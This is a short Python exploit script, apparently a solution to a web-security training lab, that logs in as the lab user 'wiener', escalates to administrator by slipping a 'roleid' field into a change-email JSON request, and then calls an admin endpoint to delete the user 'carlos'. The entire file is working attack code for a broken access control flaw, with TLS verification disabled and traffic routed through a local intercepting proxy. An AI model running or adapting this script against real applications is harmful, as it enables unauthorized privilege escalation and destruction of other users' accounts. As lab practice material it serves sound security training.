import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(s, url):

    # login as the wiener user
    login_url = url + "/login"
    data_login = {"username": "wiener", "password": "peter"}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("(+) Successfully logged in as the wiener user.")

        # Change the role id of the user
        change_email_url = url + "/my-account/change-email"
        data_role_change = {"email":"test@test.ca", "roleid": 2}
        r = s.post(change_email_url, json=data_role_change, verify=False, proxies=proxies)
        res = r.text
        if 'Admin' in res:
            print("(+) Successfully changed the role id.")

            # Delete the Carlos user
            delete_carlos_user_url = url + "/admin/delete?username=carlos"
            r = s.get(delete_carlos_user_url, verify=False, proxies=proxies)

            if r.status_code == 200:
                print("(+) Successfully delete Carlos user.")
            else:
                print("(-) Could not delete Carlos user.")
                sys.exit(-1)
        else:
            print("(-) Could not change the role id.")
            sys.exit(-1)
    else:
        print("(-) Could not login as the wiener user.")
        sys.exit(-1)



def main():
    if len(sys.argv) != 2:
        print("Usage: %s <url>" % sys.argv[0])
        print("Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    delete_user(s, url)


    

if __name__ == "__main__":
    main()